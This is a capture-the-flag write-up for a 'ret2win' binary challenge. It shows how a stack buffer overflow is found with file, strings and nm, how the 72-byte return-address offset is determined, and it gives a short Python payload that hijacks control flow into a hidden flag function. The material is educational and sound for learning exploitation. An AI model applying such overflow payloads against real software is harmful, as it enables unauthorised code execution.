# ret2win – Writeup

## Challenge Description

> A vulnerable SECLEAF access terminal was recovered from a decommissioned internal server.
>
> The developers claimed the system was “unbreakable.”
>
> Can you prove otherwise?

---

# Initial Analysis

The challenge title:

```txt
ret2win
```

immediately suggested a classic binary exploitation pattern:
- stack buffer overflow
- overwritten return address
- redirecting execution into a hidden function

---

# Inspecting the Binary

I first inspected the binary using:

```bash
file ret2win
```

Then extracted embedded strings:

```bash
strings ret2win
```

This revealed several important strings:

```txt
Access Granted!
Flag: %s
vuln
decode
```

The presence of:
- a vulnerable-looking function (`vuln`)
- a hidden-looking function (`decode`)
- and flag-related output

strongly suggested that the binary contained a hidden success path.

---

# Enumerating Functions

Next, I inspected the binary symbols:

```bash
nm ret2win
```

This revealed the address of the hidden function:

```txt
0x4011b1
```

The `decode()` function appeared to be the target function responsible for printing the flag.

---

# Confirming the Buffer Overflow

To test for a stack overflow vulnerability, I sent oversized input:

```bash
python3 -c "print('A'*200)" | ./ret2win
```

The program crashed, confirming that user-controlled input could overwrite stack memory.

---

# Finding the Offset

By testing input lengths, I determined that the saved return address (RIP) was overwritten after:

```txt
72 bytes
```

This meant the exploit payload needed:
- 72 bytes of padding
- followed by the target function address

---

# Crafting the Exploit

I constructed the payload using Python:

```python
import sys
import struct

payload = b"A"*72 + struct.pack("<Q", 0x4011b1)

sys.stdout.buffer.write(payload)
```

The payload worked as follows:

| Component | Purpose |
|---|---|
| `b"A"*72` | fills the buffer and overwrites saved stack data |
| `struct.pack("<Q", 0x4011b1)` | overwrites RIP with the address of `decode()` |

---

# Exploitation

Running the exploit:

```bash
python3 exploit.py | ./ret2win
```

produced:

```txt
Access Granted!

```

---

# Key Takeaways

This challenge demonstrated:
- stack-based buffer overflows
- ret2win exploitation
- control-flow hijacking
- basic binary exploitation workflow

